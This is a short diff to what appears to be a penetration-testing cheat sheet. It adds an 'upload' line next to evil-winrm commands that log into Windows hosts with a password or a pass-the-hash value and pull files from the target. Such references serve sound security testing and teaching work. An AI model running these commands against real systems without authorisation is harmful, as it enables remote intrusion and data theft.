@@ -1414,6 +1414,7 @@ PS C:\> Enter-PSSession -ComputerName DEV01 -Credential <domain>\<username> -Con
 $ evil-winrm -i <IP address> -u <username> -p <password>
 $ evil-winrm -i <IP address> -u <username> -H <passwordhash>
 Evil-WinRM* PS C:> download <file> /tmp/<file>
+Evil-WinRM* PS C:> upload <file>
 ```
 
 - Evil-WinRM with Kerberos
